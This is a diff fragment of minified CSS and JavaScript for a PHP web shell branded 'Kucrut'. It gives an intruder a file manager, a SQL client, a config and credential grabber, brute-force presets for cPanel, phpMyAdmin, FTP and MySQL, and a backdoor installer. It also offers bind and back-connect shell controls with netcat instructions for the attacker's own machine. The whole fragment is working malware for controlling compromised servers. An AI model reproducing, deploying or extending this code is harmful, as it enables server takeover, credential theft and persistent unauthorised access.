#8a8a8a;z-index:1;pointer-events:none}.archive-icons{vertical-align:middle}.archive-type-dir{font-weight:bolder}.archive-type-file{font-weight:unset}.archive-name{cursor:pointer}.archive_dir_holder a{color:#0f0;font-weight:bolder;cursor:pointer}.archive_dir_holder a:hover{color:#fff}.editor-content{height:100%}.editor-content-holder{height:90%}.editor-contents{display:none;position:relative;height:100%}.editor-contents.editor-content-active{display:block}.history-panel-controller{position:absolute;color:#fff;padding:10px;z-index:1000;border-radius:10px;top:50%;left:19%;background-color:#009687;cursor:pointer}.sql-content{display:none;position:relative;min-height:300px}.sql-content.sql-active-content{display:block}.pages-holder{padding:7px}.pages-number{display:inline-block;margin-left:10px}.pages-holder .pages-number a.page-number{padding:5px;background:#0f304a;margin-right:8px;cursor:pointer;width:33px;display:inline-block;text-align:center;border-radius:5px;color:#fff;transition:background .5s}.active-page-number{background:#10925c!important}.pages-number a.page-number:hover{background:#8a8a8a}.terminal-content{height:100%}.terminal-content,.terminal-tab{display:none}.terminal-content.active-terminal-content{display:block;position:relative}.terminal-btn-fontctl{background:#009688;width:50px;color:#fff;font-weight:bolder;outline:0;cursor:pointer}.alert-area{max-height:100%;position:fixed;bottom:5px;left:20px;right:20px;z-index:9999}.alert-box{font-size:16px;color:#fff;background:rgba(0,0,0,.9);line-height:1.3em;padding:10px 15px;margin:5px 10px;position:relative;border-radius:5px;transition:opacity .5s ease-in;-webkit-animation:alert-shake .5s ease-in-out;animation:alert-shake .5s ease-in-out}.alert-content-title{font-weight:700}.alert-box.alert-success{background:rgba(56,127,56,.89)}.alert-error{background:rgba(191,54,54,.89)}.alert-box.hide{opacity:0}.alert-close{background:0 0;width:12px;height:12px;position:absolute;top:15px;right:15px}.alert-close:after,.alert-close:before{content:"";width:15px;border-top:solid 2px #fff;position:absolute;top:5px;right:-1px;display:block}.alert-close:before{transform:rotate(45deg)}.alert-close:after{transform:rotate(135deg)}.alert-close:hover:after,.alert-close:hover:before{border-top:solid 2px #d8d8d8}@media (max-width:767px) and (min-width:481px){.alert-area{left:100px;right:100px}}@media (min-width:768px){.alert-area{width:350px;left:auto;right:0;z-index:9999}}@keyframes tab_change_color{0%{background-color:#133d51}50%{background-color:green}}@-webkit-keyframes alert-shake{0%{-webkit-transform:translateX(0)}20%{-webkit-transform:translateX(-10px)}40%{-webkit-transform:translateX(10px)}60%{-webkit-transform:translateX(-10px)}80%{-webkit-transform:translateX(10px)}100%{-webkit-transform:translateX(0)}}@keyframes alert-shake{0%{transform:translateX(0)}20%{transform:translateX(-10px)}40%{transform:translateX(10px)}60%{transform:translateX(-10px)}80%{transform:translateX(10px)}100%{transform:translateX(0)}}.textEffect{position:absolute;width:500px;top:-10px;animation:alert-shake .5s ease-in-out;animation-iteration-count:2}.kucrutteam-loader-text{position:absolute;color:#46bb45;top:23%;left:49%;transform:translate(-50%,-50%);font-size:40px;letter-spacing:7px}.kucrut-ajax-error{position:absolute;color:#ff0a0a;top:50%;left:50%;transform:translate(-50%,-50%);font-size:30px}.connection-hist-table{margin-left:auto;margin-right:auto;text-align:justify;border-collapse:collapse}.connection-hist-table td,.connection-hist-table th{border:1px solid #ddd;text-align:left;padding:8px}.connection-his-btn{margin-bottom:10px;padding:5px;background:#206920;color:#fff;border:none;outline:0;cursor:pointer;font-weight:700;transition:background .3s}.connection-his-btn.connection-delete{margin:unset;padding:5px;background:red;width:33px;border-radius:3px;transition:background .3s}.connection-delete:hover{background:#f56969!important}.connection-his-btn:hover{background:#30b330}#up_bar_holder{position:fixed;z-index:100000;width:100%}#filesman_tabs{padding:8px;border:1px solid #0e304a;color:#67abdf;overflow-x:auto;white-space:nowrap}.sortable-ghost{opacity:.5;background:#c8ebfb}.folder-tab-icon{width:16px!important}#filesman-tab-full-path{display:none;position:absolute;pointer-events:none;background:#163746;padding:7px;color:#0f0;border-radius:10px;min-width:58px;z-index:10}#filesman-tab-full-path::after{content:"";position:absolute;top:100%;left:35px;margin-left:-5px;border-width:5px;border-style:solid;pointer-events:none;border-color:#163746 transparent transparent transparent}.mysql-main{height:84vh;position:relative}.mysql-hide-content{display:none}.mysql-query-result-tabs{margin-bottom:10px;padding:3px;border-bottom:4px solid #0f304a}.mysql-main .tables-panel-ctl{position:absolute;color:#fff;padding:10px;z-index:1;border-radius:10px;top:45%;left:calc(17% + 10px);background-color:#009687;cursor:pointer}.tables-panel-ctl-min{left:-21px!important}.mysql-query-result-tabs div{display:inline-block;padding:5px;margin-right:2px;background:#133d51;color:#fff;cursor:pointer;transition:background-color .5s}.mysql-query-result-tabs div:hover{background-color:#a23939}.mysql-query-result-tabs div.mysql-query-selected-tab{background:red}table tr.tbl_row:nth-child(odd){background:#424040}.mysql-tables .tables-row{margin-left:26px}.mysql-main .mysql-query-results,.mysql-main .mysql-tables{float:left;height:100%;overflow:auto}.mysql-main .mysql-query-results{width:calc(80% + 4px);margin-left:5px;position:relative;overflow:unset}.mysql-main .mysql-query-results-fixed{width:100%}.mysql-main .mysql-query-results .mysql-query-content{height:89%;overflow:auto}.mysql-query-tab-hide{height:0!important;padding:0!important}.mysql-main .mysql-tables{width:19%;border-right:4px solid #0e304a}.mysql-main table td{vertical-align:top}.mysql-main .mysql-search-area table td{vertical-align:middle;padding:7px}.mysql-tables .block{position:relative;width:1.5em;height:1.5em;min-width:16px;min-height:16px;float:left}.mysql-tables div.block b,.mysql-tables div.block i{width:1.5em;height:1.7em;min-width:16px;min-height:8px;position:absolute;bottom:.7em;left:.75em;z-index:0}.mysql-tables .block i{display:block;border-left:1px solid #666;border-bottom:1px solid #666;position:relative;z-index:0}.mysql-tables .block b{display:block;height:.75em;bottom:0;left:.75em;border-left:1px solid #666}.mysql-tables div.block a,.mysql-tables div.block u{position:absolute;left:50%;top:50%;z-index:10}.mysql-tables div.block img{position:relative;top:-.6em;left:0;margin-left:-7px}.mysql-tables .clearfloat{clear:both}.mysql-tables ul{list-style-type:none;margin-left:0;padding:0}.mysql-tables ul li{white-space:nowrap;clear:both;min-height:16px}.mysql-tables .db_name{margin-left:10px}.mysql-tables .list_container{border-left:1px solid #666;margin-left:.75em;padding-left:.75em}.hide-db-tables{display:none}.mysql-main:after{content:"";display:table;clear:both}table.mysql-data-tbl{border:none!important;border-collapse:collapse!important}table.mysql-data-tbl tr th{padding:5px}table.mysql-data-tbl td{border-left:3px solid #305a8d;border-right:3px solid #305a8d;padding:6px}table.mysql-data-tbl td:first-child{border-left:none}table.mysql-data-tbl td:last-child{border-right:none}.mysql-insert-result,.mysql-structure-qres,.mysql-update-result{display:none;text-align:center;padding:10px;border:1px dashed;margin:22px}#kucrut-copyright{margin-top:15px}.ic_b_plus{background-image:url(https://solevisible.com/icons/menu/b_plus.png)}.ic_b_minus{background-image:url(https://solevisible.com/icons/menu/b_minus.png)}
-    <?php echo '
+<?php echo '
 @keyframes spin {from {transform: rotate(0deg);}to{transform: rotate(360deg);}}
 @-webkit-keyframes spin {from {-webkit-transform: rotate(0deg);}to {-webkit-transform: rotate(360deg);}}
 @-moz-keyframes spin {from {-moz-transform: rotate(0deg);}to {-moz-transform: rotate(360deg);}}
@@ -1437,7 +1437,7 @@ var a_ = '" . htmlspecialchars(@$_POST['a']) ."';
 var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."';
 var islinux = ".($GLOBALS['sys']!="win"?'true':'false').";
 var post_encryption_mode = ".(__HOST_POST_ENCRYPTION__?'true':'false').";";?>
-var kucrut1_="",kucrut2_="",kucrut3_="",kucrut4_="",kucrut5_="",kucrut6_="",kucrut7_="",kucrut8_="",kucrut9_="",kucrut10_="",d=document,mysql_cache={},editor_files={},editor_error=!0,editor_current_file="",php_temrinal_using_cgi=!1,is_minimized=!1,cgi_is_minimized=!1,options_window_is_minimized=!1,database_window_is_minimized=!1,rightclick_menu_context=null,can_hashchange_work=!0,kucrut_can_add_opt=!1,kucrut_before_do_action_id="",kucrut_ace_editors={editor:null,eval:null},col_dumper_selected_data={},_KUCRUT_AJAX_={},cgi_lang="",upcount=1,terminal_walk_index=[],kucrut_current_fm_id=1,kucrut_fm_id=0;function set(e,a,t,i,l,o,r,n,s,c,f,_,u){d.mf.a.value=null!=e?e:a_,d.mf.c.value=null!=a?a:c_,d.mf.kucrut1.value=null!=t?t:"",d.mf.kucrut2.value=null!=i?i:"",d.mf.kucrut3.value=null!=l?l:"",d.mf.kucrut4.value=null!=o?o:"",d.mf.kucrut5.value=null!=r?r:"",d.mf.kucrut6.value=null!=n?n:"",d.mf.kucrut7.value=null!=s?s:"",d.mf.kucrut8.value=null!=c?c:"",d.mf.kucrut9.value=null!=f?f:"",d.mf.kucrut10.value=null!=_?_:"",d.mf.charset.value=null!=u?u:charset_}function fc(e){var a=kucrut_current_fm_id,t="a="+kucrutb64("FilesMan")+"&c="+kucrutb64(e.c.value)+"&kucrut1="+kucrutb64(e.kucrut1.value)+"&ajax="+kucrutb64("true")+"&",i="",l=0;if(d.querySelectorAll("#filesman_holder_"+a+" form[name=files] input[type=checkbox]").forEach(function(e){e.checked&&(l++,i+="f[]="+kucrutb64(decodeURIComponent(e.value))+"&")}),0==l&&"paste"!=e.kucrut1.value)return!1;switch(kucrutloader("filesman_holder_"+a,"block"),e.kucrut1.value){case"delete":d.querySelectorAll("#filesman_holder_"+a+" .fmanager-row").forEach(function(e){var a=e.querySelector("input[type=checkbox]");a.checked&&".."!=a.value?e.remove():a.checked=!1}),d.querySelector("#filesman_holder_"+a+" .chkbx").checked=!1;break;case"copy":case"move":case"zip":case"unzip":d.querySelectorAll("#filesman_holder_"+a+" input[type=checkbox]:checked").forEach(function(e){e.checked=!1})}_Ajax(d.URL,t+i,function(e){kucrutloader("filesman_holder_"+a,"none"),kucrutFmngrContextRow()},!1,"filesman_holder_"+a)}function initDir(e){var a="",t="";islinux&&(a="<a class=\"header_pwd\" onclick=\"g('FilesMan','/');\" path='/' href='#action=fileman&path=/'>/</a>",t="/");var l=e.split("/"),o="",r=islinux?"/":"";for(i in"-1"!=l.indexOf("..")&&(l.splice(l.indexOf("..")-1,1),l.splice(l.indexOf(".."),1)),l)""!=l[i]&&(o+="<a onclick=\"g('FilesMan','"+r+l[i]+"/');\" path='"+r+l[i]+"/' href='#action=fileman&path="+r+l[i]+'/\' class="header_pwd">'+l[i]+"/</a>",r+=l[i]+"/");$("header_cwd").innerHTML=a+o+" ",kucrutInitCwdContext(),l=(l=t+l.join("/")).replace("//","/"),d.footer_form.c.value=l,$("footer_cwd").value=l,c_=l}function evalJS(html){var newElement=document.createElement("div");newElement.innerHTML=html;for(var scripts=newElement.getElementsByTagName("script"),i=0;i<scripts.length;++i){var script=scripts[i];eval(script.innerHTML)}}function _Ajax(e,a,t,i,l){var o=!1;return window.XMLHttpRequest?o=new XMLHttpRequest:window.ActiveXObject&&(o=new ActiveXObject("Microsoft.XMLHTTP")),void 0!==l&&(_KUCRUT_AJAX_[l]=o),o?(o.onreadystatechange=function(){4==o.readyState&&200==o.status?"function"==typeof t&&(t(o.responseText,l),kucrutClearAjax(l)):4==o.readyState&&200!=o.status&&(kucrutAjaxError(o.status,l,o.statusText,o.responseText),kucrutClearAjax(l))},o.open("POST",e,!0),o.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),void o.send(a)):void alert("Error !")}function kucrutClearAjax(e){_KUCRUT_AJAX_.hasOwnProperty(e)&&delete _KUCRUT_AJAX_[e]}function handleup(e,a){var t="__fnameup";if(0!=a&&(t="__fnameup"+a),e.files.length>1){for(var i="",l=0;l<e.files.length;l++)i+=e.files[0].name+", ";$(t).innerHTML=i}else e.files[0].name&&($(t).innerHTML=e.files[0].name)}function u(e){var a=!1,t=0,i=kucrut_current_fm_id,l=new FormData,o="filesman_holder_"+i;l.append("a",kucrutb64(e.a.value)),l.append("c",kucrutb64(e.c.value)),l.append("kucrut1",kucrutb64(e.kucrut1.value)),l.append("charset",kucrutb64(e.charset.value)),l.append("ajax",kucrutb64(e.ajax.value)),e.querySelectorAll("input[type=file]").forEach(function(e){if(0==e.value.length)return!1;if(e.files.length>1)for(var a=0;a<e.files.length;a++)l.append("f[]",e.files[a]);else l.append("f[]",e.files[0]);t++}),$("footerup").value="",$("__fnameup").innerHTML="";for(var r=1;r<=upcount;r++){var n=$("pfooterup_"+r);n&&n.parentNode.removeChild(n),upcount--}if(0==upcount&&upcount++,0==t)return!1;var s="up_bar_"+getRandom();$("up_bar_holder").insertAdjacentHTML("beforeend","<div id='"+s+"' class='up_bar'></div>");e.c.value;if(window.XMLHttpRequest?a=new XMLHttpRequest:window.ActiveXObject&&(a=new ActiveXObject("Microsoft.XMLHTTP")),a){var c=$(s);_KUCRUT_AJAX_[s]=a,a.upload&&(c.style.display="block",a.upload.onprogress=function(e){var a=e.position||e.loaded,t=e.totalSize||e.total,i=Math.floor(a/t*1e3)/10+"%";c.style.width=i}),a.onload=function(e){200===a.status?c.style.display="none":kucrutAjaxError(a.status,"upload_area",a.statusText,a.responseText),kucrutClearAjax(s)},a.onreadystatechange=function(){if(4==a.readyState&&200==a.status){if("noperm"!=a.responseText&&"[]"!=a.responseText){var e,t=JSON.parse(a.responseText),l="",r=d.querySelectorAll("#"+o+" #filemanager_table tr").length-3;for(e in t){++r;var n=t[e].name,s=encodeURIComponent(n),c=t[e].size,f=t[e].perm,_=t[e].modify,u=t[e].owner,p=loadType(n,"file");try{d.querySelector("#"+o+" .fmanager-row a[fname='"+n+"']").parentElement.parentElement.parentElement.remove()}catch(e){}l+='<tr class="fmanager-row" id="tr_row_'+r+'"><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="'+n+'" class="chkbx" id="checkbox'+r+'"><label for="checkbox'+r+'"></label></div></td><td id="td_row_'+r+'">'+p+'<div style="position:relative;display:inline-block;bottom:12px;"><a row="'+r+'" id="id_'+r+'" class="main_name" onclick="editor(\''+s+"','auto','','','','file');\" href=\"#action=fileman&amp;path="+c_+"&amp;file="+s+'" fname="'+n+'" ftype="file" path="'+c_+'" opt_title="">'+n+'</a></div></td><td><span style="font-weight:unset;" class="main_size">'+c+'</span></td><td><span style="font-weight:unset;" class="main_modify">'+_+'</span></td><td><span style="font-weight:unset;" class="main_owner_group">'+u+'</span></td><td><a id="id_chmode_'+r+'" href="javascript:void(0)" onclick="editor(\''+s+"','chmod','','','','file')\">"+f+'</a></td><td><a id="id_rename_'+r+'" title="Rename" class="actions" href="javascript:void(0);" onclick="editor(\''+s+"', 'rename','','','','file')\">R</a> <a id=\"id_touch_"+r+'" title="Modify Datetime" class="actions" href="javascript:void(0);" onclick="editor(\''+s+"', 'touch','','','','file')\">T</a> <a id=\"id_edit_"+r+'" class="actions" title="Edit" href="javascript:void(0);" onclick="editor(\''+s+"', 'edit','','','','file')\">E</a> <a id=\"id_download_"+r+'" title="Download" class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''+n+"', 'download')\">D</a><a id=\"id_delete_"+r+'" title="Delete" class="actions" href="javascript:void(0);" onclick="var chk = confirm(\'Are You Sure For Delete # '+s+" # ?'); chk ? g('FilesMan',null,'delete', '"+s+"') : '';\"> X </a></td></tr>"}d.querySelector("#"+o+" #filemanager_last_tr").insertAdjacentHTML("beforebegin",l),kucrutShowNotification("File(s) uploaded successfully","Uploader"),kucrutFmngrContextRow()}else kucrutShowNotification("Folder has no permission...","Uploader","error");kucrutCheckCurrentFilesManTab(i)}},a.open("POST",d.URL),a.send(l)}}function kucrutCheckCurrentFilesManTab(e){-1==$("filesman_tab_"+e).classList.value.indexOf("filesman-tab-active")&&$("filesman_tab_"+e).classList.add("tab-is-done")}function g(a,c,kucrut1,kucrut2,kucrut3,kucrut4,kucrut5,kucrut6,kucrut7,kucrut8,kucrut9,kucrut10,charset){var fm_id=0==kucrut_fm_id?kucrut_current_fm_id:kucrut_fm_id,fm_id2=kucrut_fm_id,fm_path=null==c||0==c.length?c_:c,d_mf_c=fm_path,g_action_id=kucrut_before_do_action_id;0==kucrut_fm_id&&(set(a,c,kucrut1,kucrut2,kucrut3,kucrut4,kucrut5,kucrut6,kucrut7,kucrut8,kucrut9,kucrut10,charset),d_mf_c=d.mf.c.value),"GetConfig"!=a&&"download"!=kucrut2&&islinux&&"/"!=d_mf_c.substr(0,1)&&(d_mf_c="/"+d_mf_c),"FilesMan"==a?(kucrutloader("filesman_holder_"+fm_id,"block"),g_action_id="filesman_holder_"+fm_id):""!=g_action_id?kucrutloader(g_action_id,"block"):"FilesTools"!=a&&"download"!=kucrut2&&"GetConfig"!=a&&("sql"==a?(showEditor("database_window"),g_action_id=loadPopUpDatabase("")):"FilesMan"!=a&&(showEditor("options_window"),g_action_id=loadPopUpOpTions(a)),kucrutloader(g_action_id,"block"));for(var data="a="+kucrutb64(a)+"&c="+kucrutb64(d_mf_c)+"&",i=1;i<=10;i++)data+="kucrut"+i+"="+kucrutb64(eval("d.mf.kucrut"+i+".value"))+"&";if("FilesMan"==a){var pagenum=d.querySelector("#"+g_action_id+" .page-number.active-page-number");null!=pagenum&&(data+="pagenum="+kucrutb64(getCookie(g_action_id+"_page_number")),setCookie(g_action_id+"_page_number",1,2012))}if(data+="&ajax="+kucrutb64("true"),"FilesTools"==a&&"download"==kucrut2){kucrutLoaderOnTop("none");var dl=$("dlForm");return dl.a.value=kucrutb64("dlfile"),dl.c.value=kucrutb64(d_mf_c),dl.file.value=kucrutb64(kucrut1),void dl.submit()}"GetConfig"!=a?(_Ajax(d.URL,data,function(e,t){evalJS(e);var i=!1;if(kucrutLoaderOnTop("none"),"sql"==a)return console.log(t),loadPopUpDatabase(e,t),!1;if("FilesMan"==a){kucrutloader("filesman_holder_"+fm_id,"none"),d.querySelector("#filesman_holder_"+fm_id).innerHTML=e,fm_path=fm_path.replace(/\/\//g,"/"),$("filesman_tab_"+fm_id).setAttribute("path",fm_path);var l=kucrutGetLastFolderName(fm_path);d.querySelector("#filesman_tab_"+fm_id+" span").innerHTML=l,kucrutFmngrContextRow(),"function"==typeof kucrut1&&kucrut1(e),kucrutCheckCurrentFilesManTab(fm_id)}else(options_window_is_minimized||"."==t.substr(0,1))&&"."==t.substr(0,1)&&(i=!0,t=t.substr(1),showEditor("options_window")),i||kucrutloader(t,"none"),loadPopUpOpTions(t,e),"phpeval"==a&&kucrutLoadAceEditor("PhpCode"),"coldumper"==a.substr(0,9)&&kucrutColDumperInit()},!1,""==g_action_id?"."+a:g_action_id),g_action_id="",0==fm_id2&&c!=c_&&c&&initDir(c)):(kucrutloader(kucrut3,"block"),_Ajax(d.URL,data,function(e,a){var t=a;a=d.querySelector("#"+("id_db"!=a.substr(0,5)?"option_"+a:a));try{(e=JSON.parse(e)).host&&e.user&&e.dbname&&($("db_host")&&(a.querySelector("#db_host").value=e.host),$("db_user")&&(a.querySelector("#db_user").value=e.user),$("db_name")&&(a.querySelector("#db_name").value=e.dbname),$("db_pw")&&(a.querySelector("#db_pw").value=e.password),$("db_prefix")&&e.prefix&&(a.querySelector("#db_prefix").value=e.prefix),$("cc_encryption_hash")&&e.cc_encryption_hash&&(a.querySelector("#cc_encryption_hash").value=e.cc_encryption_hash))}catch(e){}kucrutloader(t,"none")},!1,kucrut3))}function kucrutGetLastFolderName(e){var a=e.replace(/\/\//g,"/").split("/");for(var t in a)0==a[t].length&&a.splice(t,1);var i=a[a.length-1];return 0==i.length&&(i="/"),i}function kucrutloader(e,a){if(0==e.length)return!1;try{var t=$("loader_"+e);if(null==t&&"block"==a){var i=null;"editor"==e?i=d.querySelector("#editor .editor-modal"):"id_db"==e.substr(0,5)?i=$(e):"terminal_id"==e.substr(0,11)?i=$(e):"editor"==e.substr(0,6)?i=$(e):"cgiframe"==e?i=$("cgiframe"):"filesman_holder"==e.substr(0,15)?(i=$(e)).style.minHeight="300px":i=$("option_"+e),i.insertAdjacentHTML("afterbegin","<div id='loader_"+e+'\' class="options-loader-holder"><div parent="'+e+'" onclick="kucrutAjaxController(this);" class="stopAjax">[ Stop it ]</div><div class="kucrutteam-loader-text">Tobrut Style</div><div class="kucrut-ajax-error"></div><img src=\'https://iili.io/2M3GdE7.png\'></div>')}else"filesman_holder"==e.substr(0,15)&&($(e).style.minHeight="0"),null!=t&&(t.style.display=a)}catch(e){}}function fs(e){var a=e.getAttribute("db_id"),t=d.querySelector("#"+a+" div.sf");mysql_cache.hasOwnProperty(a)||(mysql_cache[a]={}),kucrutloader(a,"block");var i=t.querySelector("input[name=sql_host]").value,l=t.querySelector("input[name=sql_login]").value,o=t.querySelector("input[name=sql_pass]").value,r=t.querySelector("input[name=sql_base]")?t.querySelector("input[name=sql_base]").value:t.querySelector("select[name=sql_base]").value,n=t.querySelector("select[name=type]").value,s=t.querySelector("input[name=sql_count]").checked?"true":"";_Ajax(d.URL,"a="+kucrutb64("Sql")+"&kucrut1="+kucrutb64("query")+"&kucrut2=&c="+kucrutb64(c_)+"&charset="+kucrutb64("UTF-8")+"&type="+kucrutb64(n)+"&sql_host="+kucrutb64(i)+"&sql_login="+kucrutb64(l)+"&sql_pass="+kucrutb64(o)+"&sql_base="+kucrutb64(r)+"&sql_count="+kucrutb64(s)+"&current_mysql_id="+kucrutb64(a)+"&ajax="+kucrutb64("true"),function(e,a){loadPopUpDatabase(e,a),evalJS(e),kucrutloader(a,"none")},!1,a)}function ctlbc(e){var a=$("bcStatus"),t=$("bcipAction");"bind"==e.value?(t.style.display="none",a.innerHTML="<small>Press ` <font color='red'>>></font> ` button and run ` <font color='red'>nc server_ip port</font> ` on your computer</small>"):(t.style.display="inline-block",a.innerHTML="<small>Run ` <font color='red'>nc -l -v -p port</font> ` on your computer and press ` <font color='red'>>></font> ` button</small>")}function $(e){return d.getElementById(e)}function addnewup(){var e="footerup_"+upcount,a="pfooterup_"+upcount,t=1!=upcount?"pfooterup_"+(upcount-1):"pfooterup",i=d.createElement("p");i.innerHTML='<label class="inputfile" for="'+e+'"><span id="__fnameup'+upcount+'"></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id="'+e+'" type="file" name="f[]" onChange="handleup(this,'+upcount+');" multiple>',i.id=a,i.appendAfter($(t)),upcount++}function kucrut_searcher_tool(e){switch(e){case"all":case"dirs":_kucrutSet(!0,"Disabled");break;case"files":_kucrutSet(!1,"php")}}function _kucrutSet(e,a){d.srch.ext.disabled=e,d.srch.ext.value=a}function dis_input(e){switch(e){case"phpmyadmin":bruteSet(!0,"Disabled","http://");break;case"direct":bruteSet(!1,"2222","http://");break;case"cp":bruteSet(!1,"2082","http://");break;case"ftp":bruteSet(!0,"Disabled","ftp://");break;case"mysql":bruteSet(!1,"3306","http://");break;case"ftpc":bruteSet(!1,"21","http://")}}function bruteSet(e,a,t){c="21"!=a?"localhost":"ftp.example.com",$("port").disabled=e,$("port").value=a,$("target").value=c,$("protocol").value=t}function inBackdoor(e){"my"==e.value?$("backdoor_textarea").style.display="block":$("backdoor_textarea").style.display="none"}function saveByKey(e){return!("s"==String.fromCharCode(e.which).toLowerCase()&&e.ctrlKey||19==e.which)||($("editor_edit_area").onsubmit(),e.preventDefault(),!1)}function kucrutAjaxError(e,a,t,i){if(void 0!==a){var l=d.querySelector("#loader_"+a);null!=l&&(firewall="",403==e&&(firewall=" ~ FireWall Detected!"),l.querySelector("img").remove(),l.querySelector(".kucrut-ajax-error").innerHTML=e+" ( "+t+firewall+" )",kucrutShowNotification(t,"Ajax","error"))}}function kucrutInitCwdContext(){d.querySelectorAll(".header_pwd").forEach(function(e){e.addEventListener("contextmenu",function(e){var a=e.target.getAttribute("path"),t=d.querySelector("#rightclick_menu > a[name=newtab]");t.setAttribute("href","javascript:void(0);"),t.removeAttribute("target"),t.onclick=function(){kucrutFilesManNewTab(a,"/")};var i=e.clientX,l=e.clientY;kucrutSortMenuItems(["newtab"]),kucrutRightClickMenu(i,l),e.preventDefault()})})}function kucrutRightClickMenu(e,a){rightclick_menu_context.top=a+"px",rightclick_menu_context.left=e+"px",rightclick_menu_context.visibility="visible",rightclick_menu_context.opacity="1"}function kucrutSortMenuItems(e){var a=["newtab","link","download","view","edit","move","copy","rename","modify","permission","compress","extract","delete","view_archive"],t=!1;for(var i in a){for(var l in t=!1,e)a[i]!=e[l]||(d.querySelector("#rightclick_menu > a[name="+a[i]+"]").style.display="block",t=!0);t||(d.querySelector("#rightclick_menu > a[name="+a[i]+"]").style.display="none")}}function kucrutAceChangeSetting(e,a){var t=e.options[e.selectedIndex].value,i=e.getAttribute("base"),l=kucrut_ace_editors.editor;"eval"==i&&(l=kucrut_ace_editors.eval);var o=e.getAttribute("ace_id");"lang"==a?l[o].session.setMode("ace/mode/"+t):"theme"==a&&l[o].setTheme("ace/theme/"+t),setCookie("kucrut_ace_"+a+"_"+i,t,2012)}function kucrutAceChangeWrapMode(e,a){var t=kucrut_ace_editors.editor;"eval"==a&&(t=kucrut_ace_editors.eval);var i=e.getAttribute("ace_id");e.checked?t[i].session.setUseWrapMode(!0):t[i].session.setUseWrapMode(!1)}function kucrutAceChangeFontSize(e,a,t){var i=kucrut_ace_editors.editor;"eval"==e&&(i=kucrut_ace_editors.eval);var l=t.getAttribute("ace_id"),o=i[l].getFontSize();"+"==a?++o:--o,i[l].setFontSize(o),setCookie("kucrut_ace_fontsize_"+e,o,2012)}function setCookie(e,a,t){var i=new Date;i.setTime(i.getTime()+24*t*60*60*1e3);var l="expires="+i.toUTCString();document.cookie=e+"="+a+";"+l+";path=/"}function getCookie(e){var a=("; "+document.cookie).split("; "+e+"=");if(2==a.length)return a.pop().split(";").shift()}function editorClose(e){if(d.body.style.overflow="visible",elem=$(e),elem.setAttribute("class","editor-anim-close"),"editor"==e){if(is_minimized=!1,null!=kucrut_ace_editors.editor&&null!=kucrut_ace_editors.editor){for(var a in kucrut_ace_editors.editor)kucrut_ace_editors.editor[a].destroy();kucrut_ace_editors.editor=null,d.querySelector(".editor-tabs").innerHTML="",d.querySelector(".editor-content-holder").innerHTML=""}}else if("cgiloader"==e)php_temrinal_using_cgi&&(d.querySelector(".terminal-tabs").innerHTML="",d.querySelector(".terminal-contents").innerHTML=""),php_temrinal_using_cgi=!1,cgi_is_minimized=!1;else if("options_window"==e){if(options_window_is_minimized=!1,null!=kucrut_ace_editors.eval){for(var a in kucrut_ace_editors.eval)kucrut_ace_editors.eval[a].destroy();kucrut_ace_editors.eval=null,d.querySelectorAll(".php-evals").forEach(function(e){e.removeAttribute("ace")})}}else"database_window"==e&&(database_window_is_minimized=!1);setTimeout(function(){elem=$(e),elem.removeAttribute("class"),elem.style.display="none","options_window"==e&&(elem.querySelector(".options_tab").innerHTML="",elem.querySelector(".options_content").innerHTML="")},1e3),d.body.style.overflow="visible"}function popupWindowBackPosition(){var e={cgiloader:cgi_is_minimized,options_window:options_window_is_minimized,database_window:database_window_is_minimized,editor:is_minimized},a=[];for(var t in e)e[t]&&a.push(t);1==a.length?$(a[0]+"-minimized").style.top="30%":2==a.length?($(a[0]+"-minimized").style.top="20%",$(a[1]+"-minimized").style.top="50%"):3==a.length?($(a[0]+"-minimized").style.top="0%",$(a[1]+"-minimized").style.top="30%",$(a[2]+"-minimized").style.top="60%"):4==a.length&&($(a[0]+"-minimized").style.top="0%",$(a[1]+"-minimized").style.top="30%",$(a[2]+"-minimized").style.top="55%",$(a[3]+"-minimized").style.top="80%")}function showEditor(e){if($(e).setAttribute("class","editor-anim-show"),$(e+"-minimized").setAttribute("class","minimized-hide"),"editor"==e)is_minimized=!1;else if("cgiloader"==e)cgi_is_minimized=!1;else if("options_window"==e){options_window_is_minimized=!1;var a=d.querySelector("#options_window .content_options_holder .options_tab .tab_name.tab_is_active.tab-is-done");null!=a&&a.classList.remove("tab-is-done")}else"database_window"==e&&(database_window_is_minimized=!1);popupWindowBackPosition(),d.body.style.overflow="hidden"}function editorMinimize(e){$(e).setAttribute("class","editor-anim-minimize"),$(e+"-minimized").setAttribute("class","minimized-show"),"editor"==e?is_minimized=!0:"cgiloader"==e?cgi_is_minimized=!0:"options_window"==e?options_window_is_minimized=!0:"database_window"==e&&(database_window_is_minimized=!0),popupWindowBackPosition(),d.body.style.overflow="visible"}function clearEditorHistory(){if(confirm("Are u Sure?"))for(var e in editor_files)e!=editor_current_file&&removeHistory(e)}function isArchive(e){var a,t=[".tar.gz",".tar.bz2",".tar.z",".tar.xz",".zip",".zipx",".7z",".bz2",".gz",".rar",".tar",".tgz"];for(a in t)if(new RegExp("(.*)("+t[a].replace(/\./g,"\\.")+")$","gi").test(e))return!0;return!1}function editor(e,a,t,i,l,o){if("dir"==o&&".."==e)return!1;if("download"==a)return g("FilesTools",i,e,"download"),!1;var r="",n="",s="",c="",f=d.mf.c.value,_=!0;if(e=e.trim(),0==Object.keys(editor_files).length){var u=getCookie("kucrut_history_files");try{for(var p in u=atob(u),editor_files=JSON.parse(u))insertToHistory(p,editor_files[p].file,0,editor_files[p].type)}catch(e){}}if("phar://"==e.substr(0,7))f=c_;else if(-1!=e.indexOf("/")){var m=e.split("/");e=m[m.length-1],delete m[m.length-1],f=m.join("/"),islinux&&(f="/"+f)}if(void 0===o&&(o=""),void 0!==i&&null!=i&&0!=i.length&&(f=i.trim()),"auto"==a&&isArchive(e))return kucrutSyncMenuToOpt(e,!0),!1;try{for(var v in editor_files)if(editor_files[v].file==decodeURIComponent(e)&&editor_files[v].pwd.replace(/\//g,"")==f.replace(/\//g,"")){_=!1,l=v;break}}catch(e){}if(editor_error=!0,void 0!==t&&0!=t.length&&null!=t&&(r=kucrutb64(t)),void 0!==l&&null!=l&&0!=l.length)n=kucrutb64(l),s=l,c=l.replace("file_","");else{var h="file_"+(c=getRandom(10));n=kucrutb64(h),s=h}var b="editor_source_"+c;if(null==$(b)){try{d.querySelector(".editor-contents.editor-content-active").classList.remove("editor-content-active")}catch(e){}try{d.querySelector(".editor-tabs 